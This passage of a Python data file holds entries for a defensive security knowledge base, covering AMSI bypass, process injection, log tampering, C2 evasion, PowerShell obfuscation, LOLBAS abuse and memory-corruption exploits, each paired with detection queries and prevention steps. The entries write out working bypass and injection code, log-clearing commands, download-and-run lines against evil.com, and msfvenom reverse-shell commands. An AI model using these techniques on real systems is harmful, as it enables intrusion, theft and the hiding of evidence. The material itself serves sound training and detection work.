# Concatenation bypass:
$x = 'amsiIn' + 'itFailed'

# Character code bypass:
$x = [char]97+[char]109+[char]115+[char]105

# Backtick obfuscation (PowerShell-specific):
[Ref].Assembly.GetType('System.Management.Automation.A`msiUtils')

# Regex replace:
('Ref'.Replace('f','').Replace('e','').Trim())
```

### 4. AMSI Bypass via COM Scriptlet

```powershell
# If AMSI doesn't cover certain execution paths:
# wscript.exe / cscript.exe sometimes not covered (older Windows)
# regsvr32.exe COM scriptlets bypass AMSI in some configurations
```

### 5. .NET Reflection (AmsiContext Null)

```powershell
# Force AmsiContext to null via reflection
$amsiContext = [AppDomain]::CurrentDomain.GetData('amsiContext')
if ($amsiContext) {
    $amsiContext.GetType().GetField('_amsiSession','NonPublic,Instance').SetValue($amsiContext, $null)
}
```

## Detection Opportunities

```kql
// PowerShell Script Block Logging (Event 4104) - AMSI bypass attempts
winlog.event_id: 4104 AND
powershell.file.script_block_text: (
    "AmsiUtils" OR
    "amsiInitFailed" OR
    "AmsiScanBuffer" OR
    "amsi.dll" OR
    "VirtualProtect" OR
    "GetProcAddress.*amsi"
)

// AMSI bypass via string concatenation (fragmented known-bad strings)
// Harder to detect -- look for:
// - "amsiIn" + something or "amsi" + something in script blocks
// - Base64-encoded PowerShell that decodes to AMSI bypass

// Module logging (Event 4103): modules loaded in PowerShell session
// Unexpected: Reflection, Marshal, Runtime.InteropServices loaded before tool
```

## Prevention

1. **Script Block Logging (Event 4104)**: Captures deobfuscated script content after AMSI processes it -- even if AMSI bypassed, logging fires
2. **Module logging (Event 4103)**: Logs every module loaded in PowerShell
3. **Constrained Language Mode**: Prevents use of .NET reflection needed for AMSI bypass
4. **PowerShell v5+ mandatory**: v5 has AMSI; disable older versions via GPO
5. **EDR AMSI integration**: Modern EDRs re-implement AMSI inspection at kernel level, independent of amsi.dll
6. **Protected Event Logging**: Encrypt PowerShell logs -- prevents log tampering by attacker
""",
    },
    {
        "title": "Process Injection Techniques — DLL Injection, Process Hollowing, APC Injection",
        "tags": ["process-injection", "dll-injection", "process-hollowing", "APC", "T1055", "defense-evasion"],
        "content": r"""# Process Injection Techniques — DLL Injection, Process Hollowing, APC Injection

## Overview

Process injection executes malicious code within the address space of a legitimate process, making the malicious activity appear to come from a trusted application. This is a cornerstone of modern malware and post-exploitation frameworks.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1055.001 | Dynamic-Link Library Injection | Defense Evasion / Privilege Escalation |
| T1055.002 | Portable Executable Injection | Defense Evasion |
| T1055.004 | Asynchronous Procedure Call | Defense Evasion |
| T1055.012 | Process Hollowing | Defense Evasion |

## Technique 1 — Classic DLL Injection

```c
// 1. Open target process
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

// 2. Allocate memory in target for DLL path
LPVOID pMem = VirtualAllocEx(hProc, NULL, strlen(dll_path)+1, MEM_COMMIT, PAGE_READWRITE);

// 3. Write DLL path to allocated memory
WriteProcessMemory(hProc, pMem, dll_path, strlen(dll_path)+1, NULL);

// 4. Create remote thread that calls LoadLibraryA with our DLL path
HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
    (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"),
    pMem, 0, NULL);
WaitForSingleObject(hThread, INFINITE);

// Result: malicious.dll loaded into target_pid's address space
// All network connections, file accesses appear to come from the target process
```

## Technique 2 — Shellcode Injection

```c
// Inject raw shellcode (not DLL) -- no DLL on disk required

// 1. Allocate RWX memory in target
LPVOID pShellcode = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// 2. Write shellcode
WriteProcessMemory(hProc, pShellcode, shellcode, sc_len, NULL);

// 3. Execute
HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
```

## Technique 3 — Process Hollowing

Create a legitimate process in suspended state, hollow out its code, replace with malicious code:

```c
// 1. Create legitimate process in suspended state
CreateProcess("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL, NULL, NULL,
              FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Unmap legitimate code from process
NtUnmapViewOfSection(pi.hProcess, base_address);

// 3. Allocate and write malicious PE at same base address
VirtualAllocEx(pi.hProcess, base_address, image_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, base_address, malicious_pe, image_size, NULL);

// 4. Update thread context entry point to malicious PE's entry point
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = new_entry_point;
SetThreadContext(pi.hThread, &ctx);

// 5. Resume -- svchost.exe now running our code
ResumeThread(pi.hThread);

// Result: Task Manager shows "svchost.exe" but it's our malware
```

## Technique 4 — APC Injection

Asynchronous Procedure Calls (APCs) are queued to threads and execute when the thread enters an alertable wait state.

```c
// Inject via APC queue
// 1. Find alertable thread in target process (threads in SleepEx, WaitForSingleObjectEx)
HANDLE hThread = find_alertable_thread(target_pid);

// 2. Allocate and write shellcode
LPVOID pCode = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, pCode, shellcode, sc_len, NULL);

// 3. Queue APC
QueueUserAPC((PAPCFUNC)pCode, hThread, NULL);

// Thread executes shellcode next time it enters alertable wait state
```

## Detection Opportunities

```kql
// Sysmon Event 8: CreateRemoteThread (injection indicator)
event.code: "8" AND
NOT winlog.event_data.SourceImage: winlog.event_data.TargetImage
// Legitimate: same process; injection: different source and target

// Sysmon Event 10: Process Access with memory operations
event.code: "10" AND
winlog.event_data.GrantedAccess: ("0x1010" OR "0x1038" OR "0x1fffff") AND
NOT winlog.event_data.SourceImage: "C:\\Windows\\*"

// RWX memory region in a process that should never have it
// (alert via EDR memory scanner: PAGE_EXECUTE_READWRITE in browser, Word, etc.)

// Process hollowing: suspended process creation followed by WriteProcessMemory
event.code: "1" AND process.args: "CREATE_SUSPENDED" AND
// followed by:
event.code: "10" AND // ProcessAccess to the created process
```

## Prevention

1. **Credential Guard / VBS**: Protected Process Light prevents injection into LSASS
2. **CFG (Control Flow Guard)**: Validates indirect calls -- limits shellcode gadget use
3. **ACG (Arbitrary Code Guard)**: Prevents converting writable memory to executable -- blocks shellcode injection
4. **Process mitigation policies**: `SetProcessMitigationPolicy` -- PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY blocks unsigned code
5. **EDR memory scanning**: Periodically scan allocated memory for shellcode patterns
6. **Sysmon Event 8 alerting**: CreateRemoteThread is almost always suspicious -- alert and investigate
""",
    },
    {
        "title": "Log Evasion — Timestomping, Log Deletion, Event Log Clearing",
        "tags": ["log-evasion", "timestomping", "log-deletion", "T1070", "T1070.001", "T1099", "anti-forensics"],
        "content": r"""# Log Evasion — Timestomping, Log Deletion, Event Log Clearing

## Overview

Anti-forensics techniques destroy or falsify evidence of compromise, hindering incident response and extending dwell time. SOC analysts must recognise the signs of log tampering and maintain independent logging that attackers cannot reach.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1070.001 | Indicator Removal: Clear Windows Event Logs | Defense Evasion |
| T1070.003 | Indicator Removal: Clear Command History | Defense Evasion |
| T1099 | Timestomping | Defense Evasion |
| T1070.002 | Indicator Removal: Clear Linux/Mac System Logs | Defense Evasion |

## Timestomping

Modify file timestamps (MACE: Modified, Accessed, Created, Entry Modified) to make malicious files appear legitimate or pre-date the investigation period.

```powershell
# Windows PowerShell timestomping
$file = Get-Item "C:\\temp\\payload.exe"
$file.CreationTime = "01/01/2023 09:00:00"
$file.LastWriteTime = "01/01/2023 09:00:00"
$file.LastAccessTime = "01/01/2023 09:00:00"

# Mimikatz timestomping module
misc::timestomp /file:C:\\temp\\payload.exe /SetCreation:"01/01/2023 09:00:00"

# Linux: touch with specific timestamp
touch -t 202301010900.00 /tmp/.backdoor
touch --reference=/bin/ls /tmp/.backdoor   # copy timestamps from legitimate file
```

**Detection:** NTFS stores two timestamps per file: Standard Information (SI) and File Name (FN) attribute. Tools only modify SI. If SI < FN (created time earlier than filename record), timestomping detected.

```bash
# fls (Sleuth Kit) -- detect timestomping
fls -m / /dev/sda1 | grep payload.exe
# Compare $STANDARD_INFORMATION vs $FILE_NAME timestamps

# Plaso / log2timeline -- timeline SI vs FN discrepancies
```

## Windows Event Log Clearing

```cmd
# Clear specific event log
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Clear all event logs via PowerShell
Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }

# Via wmic
wmic nteventlog where "FileName='Security'" call ClearEventLog

# Disable Windows Event Log service (more aggressive)
sc stop "EventLog"
sc config "EventLog" start= disabled
```

**Clearing generates a new event:** Event ID **1102** (Security log cleared) and **104** (System log cleared). These are logged BEFORE clearing completes if SIEM is forwarding in near-real-time.

## Linux Log Manipulation

```bash
# Clear auth.log
echo "" > /var/log/auth.log
cat /dev/null > /var/log/syslog

# Remove specific lines (e.g., attacker's IP from auth.log)
sed -i '/10.10.10.1/d' /var/log/auth.log

# Remove bash history
history -c
echo "" > ~/.bash_history
unset HISTFILE
export HISTFILESIZE=0

# Prevent bash history recording for session
export HISTFILE=/dev/null
# Or: prefix command with space (if HISTIGNORE=" *")
 sudo su    # leading space prevents history recording
```

## Detection Opportunities

```kql
// Windows Event Log cleared
winlog.event_id: (1102 OR 104)
// Alert immediately -- this almost never happens legitimately

// SIEM gap detection: no events from host for unexpected period
// If host was logging every 30 seconds and goes silent for 10 minutes -> investigation

// Timestomping detection (requires FIM with SI/FN comparison):
// File $STANDARD_INFORMATION.CreationTime < $FILE_NAME.CreationTime

// Bash history cleared (auditd)
audit.type: "SYSCALL" AND
audit.exe: "/bin/bash" AND
audit.file.name: ".bash_history" AND
audit.syscall: ("truncate" OR "unlink")
```

## Prevention

1. **Centralised log forwarding**: Forward logs to SIEM in real-time -- attacker clearing local logs is too late
2. **Tamper-evident logs**: Azure Monitor / Elastic with write-once indices
3. **Protected Event Logging**: Encrypt Windows event logs -- prevents selective deletion
4. **Separate log server**: Logs forwarded to syslog server that compromised host cannot reach
5. **FIM with SI/FN monitoring**: Detect timestomping via NTFS attribute comparison
6. **Audit log clearing operations**: wevtutil, Clear-EventLog, and EventLog service stop should trigger immediate alerts
""",
    },
    {
        "title": "Network Evasion — Domain Fronting, CDN Abuse, Encrypted C2",
        "tags": ["domain-fronting", "CDN-abuse", "encrypted-c2", "T1090.004", "T1568", "network-evasion"],
        "content": r"""# Network Evasion — Domain Fronting, CDN Abuse, Encrypted C2

## Overview

Network-level evasion disguises C2 traffic as legitimate web communications. Domain fronting routes C2 through major CDNs, making traffic appear to originate from trusted infrastructure. Encrypted C2 hides payload content from network inspection.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1090.004 | Proxy: Domain Fronting | Command and Control |
| T1568 | Dynamic Resolution | Command and Control |
| T1573 | Encrypted Channel | Command and Control |
| T1001.003 | Data Obfuscation: Protocol Impersonation | Command and Control |

## Domain Fronting

CDNs route traffic based on the HTTP Host header, not the SNI TLS field. Attackers send traffic to a CDN endpoint (e.g., cloudfront.net) with a legitimate-looking SNI, but specify their C2 domain in the Host header.

```
Network inspection sees:
  TLS SNI: legitimate-company.cloudfront.net  <- allowed by proxy
  IP: CloudFront edge IP                       <- allowed (trusted CDN)

CDN sees (inside TLS):
  Host: attacker-c2.cloudfront.net            <- CDN routes to attacker's origin

Attacker's server:
  Receives request from CDN, responds with C2 instructions
```

```python
# Cobalt Strike malleable profile for domain fronting via CloudFront:
# Set: https-certificate -> CDN certificate
# Set SNI to legitimate CloudFront customer domain
# Set Host header to attacker's CloudFront distribution

# curl simulation:
curl --resolve legitimate.cloudfront.net:443:CLOUDFRONT_IP \
     -H "Host: evil-c2.cloudfront.net" \
     https://legitimate.cloudfront.net/beacon
```

**Status:** Major CDNs (AWS CloudFront, Azure, Google Cloud CDN) have largely blocked domain fronting (2018+). Still viable on some CDNs, CDN-on-CDN setups, and custom configurations.

## CDN Abuse (Related)

Register a domain, set up CloudFront distribution pointing to C2:

```
evil-cdn-domain.com -> CloudFront -> legitimate-looking distro -> C2 origin
Beacon checks in to: cdn.software-update.com (looks legitimate)
Actually routes to: C2 server via CloudFront
```

This is not domain fronting per se but achieves similar reputation bypassing.

## DNS-over-HTTPS (DoH) for C2

```python
# Use DoH to resolve C2 infrastructure -- bypasses corporate DNS monitoring
import requests

# Encode C2 data in DNS TXT query via DoH
query = "https://cloudflare-dns.com/dns-query?name=cmd.evil.com&type=TXT"
r = requests.get(query, headers={"accept": "application/dns-json"})
# Response TXT record contains C2 instructions

# Detection challenge: DoH encrypted, goes to 1.1.1.1 (Cloudflare) or 8.8.8.8 (Google)
# Appears as HTTPS to trusted CDN -- no DNS visibility
```

## Fast Flux DNS

```
# C2 domain rotates through many IP addresses (TTL=60s)
# Makes IP-based blocking ineffective
# Single domain: evil.com
# Round 1: 1.2.3.4, Round 2: 5.6.7.8, Round 3: 9.10.11.12 (all residential proxies)

# Detection: domain with very short TTL (< 300s) that changes IPs rapidly
# Threat intel integration: known fast-flux tracking services
```

## Protocol Tunnelling

```bash
# DNS tunnelling (iodine)
# Encode C2 data in DNS queries -- useful in networks that only allow DNS out
iodined -f -c -P password 10.0.0.1 c2.evil.com  # server
iodine -f -P password c2.evil.com                 # client
# Creates tun0 interface -- all traffic through DNS

# ICMP tunnelling (icmptunnel, ptunnel)
ptunnel-ng -x password -p evil.com -lp 2222 -da 10.0.0.1 -dp 22
# SSH through ICMP packets
```

## Detection Opportunities

```kql
// Domain fronting indicators:
// TLS SNI != HTTP Host header (requires SSL inspection)
tls.client.server_name: "*.cloudfront.net" AND
http.request.headers.host: NOT "*.cloudfront.net"

// Unusual DoH usage (HTTPS to 1.1.1.1/8.8.8.8 with DNS query path)
destination.ip: ("1.1.1.1" OR "8.8.8.8") AND
url.path: "/dns-query"

// Fast flux detection: domain with TTL < 60s changing IPs > 5x per hour
dns.answers.ttl < 60 AND
// count distinct IPs for same domain over time > 5

// DNS tunnelling: high-entropy subdomains + large TXT record responses
dns.question.name matches /[A-Za-z0-9+\/=]{30,}\./  // base64-like subdomain
```

## Prevention

1. **SSL inspection**: Decrypt and inspect HTTPS traffic -- reveals domain fronting Host header
2. **DNS monitoring**: Log all DNS queries; detect high-entropy subdomains, short TTLs, TXT record abuse
3. **Block DoH at network level**: Force all DNS through corporate resolver; block 1.1.1.1/8.8.8.8 on port 443
4. **Threat intelligence feeds**: Block known C2 domains and CDN distributions used for fronting
5. **JA3/JA3S TLS fingerprinting**: Known C2 frameworks have distinct TLS fingerprints
6. **Egress filtering**: Whitelist expected CDN destinations; alert on new CDN-hosted domains
""",
    },
    {
        "title": "PowerShell Obfuscation and ScriptBlock Logging Evasion",
        "tags": ["powershell-obfuscation", "script-block-logging", "T1027.010", "T1059.001", "Invoke-Obfuscation"],
        "content": r"""# PowerShell Obfuscation and ScriptBlock Logging Evasion

## Overview

PowerShell is the most-abused scripting engine in Windows environments. Attackers obfuscate PowerShell to bypass AMSI, signature detection, and Script Block Logging. SOC analysts must recognise obfuscated PowerShell patterns.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1027.010 | Command Obfuscation | Defense Evasion |
| T1059.001 | PowerShell | Execution |
| T1562.001 | Disable or Modify Tools | Defense Evasion |

## Common Obfuscation Techniques

### 1. Base64 Encoding

```powershell
# Encode command
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/rev.ps1')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
# Run:
powershell -enc $encoded

# Decode for analysis:
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("BASE64_HERE"))
```

### 2. String Concatenation and Variable Substitution

```powershell
# Split strings to avoid pattern matching
$a = "Inv"
$b = "oke"
$c = "-Exp"
$d = "ression"
& ($a+$b+$c+$d) "calc.exe"

# Backtick escaping (ignored by parser but breaks patterns)
I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n "calc.exe"

# String format
"{0}{1}" -f "Invoke-","Expression"
```

### 3. Invoke-Obfuscation (Daniel Bohannon)

A comprehensive PowerShell obfuscation framework with multiple layers:

```powershell
# Import and use:
Import-Module Invoke-Obfuscation.psd1
Invoke-Obfuscation
# Menu options:
# TOKEN   -> tokenise and obfuscate individual elements
# STRING  -> string splitting/encoding
# ENCODING -> base64/hex/SecureString encoding
# COMPRESS -> GZIP compression
# LAUNCHER -> obfuscated launch methods (CLIP, RUNDLL, MSHTA, etc.)

# Example output (TOKEN obfuscation of Get-Process):
&(GcM '*ET-p*') | % { $_.Name }
# Equivalent to: Get-Process | ForEach-Object { $_.Name }
```

### 4. Encoding Variants

```powershell
# Hex encoding
[char[]]@(0x49,0x45,0x58) -join ''
# IEX

# SecureString (DPAPI-encrypted at rest, decrypted at runtime)
$ss = "76492d1116743f0423413b16050a5345MgB8AE..." | ConvertTo-SecureString
# Decrypts to: IEX(...)

# Compression
$bytes = [IO.Compression.DeflateStream]::new(
    [IO.MemoryStream][Convert]::FromBase64String("COMPRESSED_BASE64"),
    [IO.Compression.CompressionMode]::Decompress)
# Decompress and execute
```

## ScriptBlock Logging Evasion

```powershell
# Method 1: Patch scriptblock logging (requires admin)
# scriptblock logging is in System.Management.Automation.dll
# Patching EnableScriptBlockLogging flag

# Method 2: Downgrade to PowerShell 2.0 (if v2 installed -- no AMSI, no SBL)
powershell -v 2 -c "IEX..."

# Method 3: Constrained Language Mode escape (if poorly configured)
# Some bypasses allow FullLanguage mode even when CLM enforced

# Method 4: Use other scripting engines that don't have SBL
# VBScript, JScript, mshta.exe -- not covered by PowerShell SBL
cscript.exe evil.vbs
mshta.exe javascript:eval("...evil...")
```

## Detection Opportunities

```kql
// Script Block Logging (Event 4104) -- key indicators
winlog.event_id: 4104 AND
powershell.file.script_block_text: (
    "FromBase64String" OR
    "IEX" OR "Invoke-Expression" OR
    "DownloadString" OR "DownloadFile" OR
    "Net.WebClient" OR
    "Reflection.Assembly" OR
    "VirtualAlloc" OR
    "WriteProcessMemory"
)

// PowerShell v2 downgrade (no AMSI/SBL coverage)
winlog.event_id: 400 AND  // PowerShell engine started
powershell.engine.version: "2.0"

// Highly obfuscated: high ratio of special characters in script block
// Character entropy analysis of script block content

// Long Base64 strings in command line
process.command_line: /-enc [A-Za-z0-9+\/=]{100,}/
```

## Prevention

1. **Script Block Logging mandatory**: GPO: Enable PowerShell Script Block Logging (Event 4104)
2. **Module Logging**: Enable via GPO; logs all module calls
3. **Transcription**: Enable `Start-Transcript` for all PS sessions; store centrally
4. **Disable PowerShell v2**: `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`
5. **Constrained Language Mode with WDAC**: Prevents most obfuscation techniques that rely on .NET reflection
6. **JEA (Just Enough Administration)**: Restrict PowerShell to specific allowed cmdlets in sensitive roles
""",
    },
    {
        "title": "Defense Evasion Through Trusted Binaries (LOLBAS)",
        "tags": ["LOLBAS", "trusted-binaries", "T1218", "T1127", "T1216", "applocker-bypass"],
        "content": r"""# Defense Evasion Through Trusted Binaries (LOLBAS)

## Overview

LOLBAS (Living Off the Land Binaries and Scripts) catalogues Windows binaries, scripts, and libraries that can be abused to bypass security controls. Because these are Microsoft-signed, they evade application allowlisting and many AV products.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1218 | System Binary Proxy Execution | Defense Evasion |
| T1127 | Trusted Developer Utilities Proxy Execution | Defense Evasion |
| T1216 | System Script Proxy Execution | Defense Evasion |

## AppLocker / WDAC Bypass

AppLocker default rules trust everything in `C:\\Windows\\` and `C:\\Program Files\\`. Many trusted binaries can execute arbitrary code.

```powershell
# regsvr32.exe -- COM scriptlet execution (squiblydoo)
regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
# Executes JScript/VBScript remotely; bypasses AppLocker; network-capable

# mshta.exe -- HTML Application execution
mshta.exe http://evil.com/payload.hta
mshta.exe "javascript:var sh=new ActiveXObject('WScript.Shell');sh.run('calc');close()"

# rundll32.exe -- execute DLL export or JavaScript
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval("new ActiveXObject('WScript.Shell').Run('calc')")

# wmic.exe -- execute XSL transform (squiblytwo)
wmic os get /format:"http://evil.com/payload.xsl"

# msiexec.exe -- execute remote MSI
msiexec.exe /q /i http://evil.com/payload.msi
```

## Trusted Developer Tools

```powershell
# MSBuild.exe -- execute C# inline tasks
# payload.xml contains C# code in <UsingTask>/<Task> elements
MSBuild.exe payload.xml

# InstallUtil.exe -- execute .NET assembly (bypasses AppLocker)
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# cmstp.exe -- bypass UAC and AppLocker via INF file
cmstp.exe /s payload.inf

# Microsoft.Workflow.Compiler.exe -- compile and execute .NET
# Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
Microsoft.Workflow.Compiler.exe args.xml /out.xml

# PresentationHost.exe -- execute XAML Browser Application (XBAP)
PresentationHost.exe -debugSecurityZoneURL http://evil.com/payload.xbap
```

## Script Proxy Execution

```powershell
# SyncAppvPublishingServer.exe -- execute PowerShell without powershell.exe
SyncAppvPublishingServer.exe "n;calc"
# Executes the argument as a PowerShell command

# pubprn.vbs -- execute JScript via cscript
cscript.exe //nologo C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:http://evil.com/payload.sct"

# appsyncpublishingserver.vbs
# Similar to pubprn.vbs -- executes remote scriptlet
```

## DLL Execution

```cmd
# rundll32 -- execute DLL export (common delivery mechanism)
rundll32.exe C:\temp\evil.dll,EntryPoint

# regsvr32 -- register DLL (calls DllRegisterServer)
regsvr32.exe /s C:\temp\evil.dll

# odbcconf.exe -- configure ODBC (can load DLL)
odbcconf.exe /a {REGSVR C:\temp\evil.dll}

# ieexec.exe (Internet Explorer) -- download and execute
ieexec.exe http://evil.com/payload.exe
```

## Detection Opportunities

```kql
// regsvr32 with network connection (squiblydoo)
event.code: "3" AND process.name: "regsvr32.exe" AND
NOT destination.ip: (internal_ranges)

// mshta spawned by unusual parent
process.name: "mshta.exe" AND
process.parent.name: NOT ("explorer.exe" OR "cmd.exe")

// MSBuild executing in temp/user directories
process.name: "MSBuild.exe" AND
process.args: NOT ("C:\\Program Files\\*" OR "C:\\Windows\\*")

// wmic fetching remote XSL
process.name: "wmic.exe" AND
process.args: ("/format:" AND "http")

// SyncAppvPublishingServer used for PS execution
process.name: "SyncAppvPublishingServer.exe" AND process.args != ""
```

## Prevention

1. **WDAC over AppLocker**: WDAC is enforced in kernel; significantly harder to bypass than AppLocker
2. **Application execution policies**: Block regsvr32.exe, mshta.exe, wmic /format from user contexts
3. **ASR Rules**: Multiple rules target specific LOLBAS abuse paths
4. **Network egress for LOLBINs**: Block outbound HTTP from regsvr32.exe, mshta.exe at proxy
5. **Disable unnecessary features**: Remove MSBuild, InstallUtil if not needed by role
6. **Monitor lolbas-project.github.io**: Continuously updated catalogue -- adapt detection rules as new entries added
""",
    },
]


# ============================================================
# COLLECTION 6: EXPLOITATION FUNDAMENTALS
# ============================================================

EXPLOITATION_FUNDAMENTALS = [
    {
        "title": "Buffer Overflow Primer — Stack, Heap, and Format String Vulnerabilities",
        "tags": ["buffer-overflow", "stack-overflow", "heap-overflow", "format-string", "T1203", "memory-corruption"],
        "content": r"""# Buffer Overflow Primer — Stack, Heap, and Format String Vulnerabilities

## Overview

Memory corruption vulnerabilities are the foundation of exploitation. Stack overflows, heap overflows, and format string bugs allow attackers to overwrite critical program data, redirect execution, and achieve arbitrary code execution. These concepts underpin CVE research, weaponised exploits, and penetration testing.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1203 | Exploitation for Client Execution | Execution |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |
| T1190 | Exploit Public-Facing Application | Initial Access |

## Stack Buffer Overflow

The stack stores local variables, return addresses, and saved registers. Overflowing a local buffer overwrites the return address, redirecting execution.

```c
// Vulnerable C program
#include <string.h>
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);   // No bounds check -- overflow possible
}
int main(int argc, char **argv) {
    vulnerable(argv[1]);
    return 0;
}
```

```
Stack layout (grows downward):
[buffer        ] <- 64 bytes
[saved EBP     ] <- 4 bytes (x86)
[return address] <- 4 bytes  <- overwrite this to redirect execution
[function args ]
```

```bash
# Exploit development workflow (x86, no mitigations):
# 1. Crash the program
python3 -c "print('A'*200)" | ./vuln

# 2. Find offset to return address (pattern_create/pattern_offset)
msf-pattern_create -l 200
# Run with pattern, note EIP value at crash
msf-pattern_offset -l 200 -q 0x41414141  # replace with actual EIP value

# 3. Control EIP
python3 -c "print('A'*68 + 'BBBB')" | ./vuln
# If EIP = 0x42424242 -> offset = 68

# 4. Find bad characters (chars that terminate or corrupt payload)
# 5. Find JMP ESP / RET gadget
msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
# Find in binary: msfpwn / ROPgadget --binary vuln | grep "jmp esp"

# 6. Add shellcode
shellcode = b"\x90" * 16  # NOP sled
shellcode += msfvenom_shellcode
payload = b"A" * 68 + jmp_esp_address + shellcode
```

## Heap Overflow

Heap overflows target dynamically allocated memory. Exploiting them requires understanding heap metadata structures.

```c
// Heap overflow example
char *buf1 = malloc(64);
char *buf2 = malloc(64);
strcpy(buf1, attacker_input);  // overflow corrupts buf2's heap chunk header
// On free(buf2): corrupted chunk metadata -> arbitrary write
```

**Heap exploitation techniques:**
- Use-After-Free (UAF): dereference freed memory that has been reallocated
- Heap spraying: fill heap with NOP+shellcode to increase hit probability
- tcache/fastbin poisoning: corrupt free list to allocate attacker-controlled memory

## Format String Vulnerability

```c
// VULNERABLE: user input passed directly to printf format string
printf(user_input);   // if user_input = "%x%x%x%n" -> reads/writes stack

// SAFE:
printf("%s", user_input);

// Format string exploitation:
# Read stack values:
printf("%x.%x.%x.%x")  -> reads 4 values from stack

# Write arbitrary value (using %n -- writes count of chars printed):
printf("%100c%n")   -> writes 100 to *arg

# Arbitrary read: %s treats stack value as pointer -> read from arbitrary address
# Arbitrary write: %n writes to pointer on stack -> overwrite return address or GOT entry
```

## Detection Opportunities

```kql
// Application crash followed by new process (crash-restart exploit attempt)
process.name: "target_app" AND
event.action: "process_stopped" AND exit_code: (11 OR 139)  // SIGSEGV
// Then same binary starts again within 30s -- retry exploitation pattern

// Stack canary violation (Linux)
// dmesg: "stack smashing detected" -- logged to syslog
syslog.message: "stack smashing detected"

// Windows heap corruption
// Event ID 1000 (Application Error) with exception 0xC0000005 (access violation)
winlog.event_id: 1000 AND winlog.event_data.ExceptionCode: "0xc0000005"

// Fuzzing pattern: many requests with incrementing length + non-printable chars
```

## Prevention

1. **Stack canaries**: `-fstack-protector-strong` (GCC) -- detect stack smashing before return
2. **ASLR**: Randomise memory layout -- makes hardcoded addresses fail
3. **DEP/NX**: Mark stack/heap non-executable -- shellcode on stack cannot execute
4. **SafeStack**: Separate safe stack for return addresses (LLVM)
5. **Static analysis**: Coverity, CodeQL identify unsafe functions (strcpy, gets, sprintf)
6. **Use safe functions**: `strncpy`, `snprintf`, `fgets` with explicit length limits
""",
    },
    {
        "title": "Shellcode Fundamentals — Writing, Encoding, and Delivery",
        "tags": ["shellcode", "T1059", "exploit-dev", "msfvenom", "position-independent-code"],
        "content": r"""# Shellcode Fundamentals — Writing, Encoding, and Delivery

## Overview

Shellcode is position-independent machine code injected into a vulnerable process to execute arbitrary actions. Understanding shellcode helps SOC analysts recognise shellcode injection patterns in memory scans, PCAP analysis, and EDR telemetry.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1059 | Command and Scripting Interpreter | Execution |
| T1055 | Process Injection | Defense Evasion |
| T1620 | Reflective Code Loading | Defense Evasion |

## What Makes Shellcode Different

Regular programs rely on fixed addresses, OS loaders, and import tables. Shellcode must:
1. Be position-independent (PIC) -- work at any memory address
2. Avoid null bytes (terminates strings in vulnerable programs)
3. Avoid bad chars (program-specific -- newlines, slashes, etc.)
4. Locate required functions dynamically (no import table)

## Simple x64 Linux Shellcode (execve /bin/sh)

```asm
; x64 Linux execve("/bin/sh", NULL, NULL)
section .text
global _start
_start:
    xor     rdi, rdi
    push    rdi               ; null terminator for string
    mov     rdi, 0x68732f2f6e69622f  ; /bin//sh in little-endian
    push    rdi
    mov     rdi, rsp          ; rdi -> "/bin//sh\x00"
    xor     rsi, rsi          ; argv = NULL
    xor     rdx, rdx          ; envp = NULL
    mov     al, 59            ; syscall number for execve
    syscall

; Assemble and extract bytes:
nasm -f elf64 shell.asm -o shell.o
objdump -d shell.o | grep -Po '\\\\t\\\\K[0-9a-f ]+'
```

## Windows Shellcode (Messagebox)

```asm
; Windows x64 -- find kernel32 base via PEB traversal
; PEB -> Ldr -> InLoadOrderModuleList -> find kernel32 -> GetProcAddress
; Then: LoadLibrary, GetProcAddress, MessageBoxA
; Tools: donut, msfvenom, Shellcode compiler, nasm

; Simpler: generate with msfvenom and embed in C stub
```

## msfvenom Shellcode Generation

```bash
# Windows x64 reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f c
# Output: C array of bytes

# Linux x64 reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f python

# Avoid null bytes (common requirement)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -b "\\x00" -f python

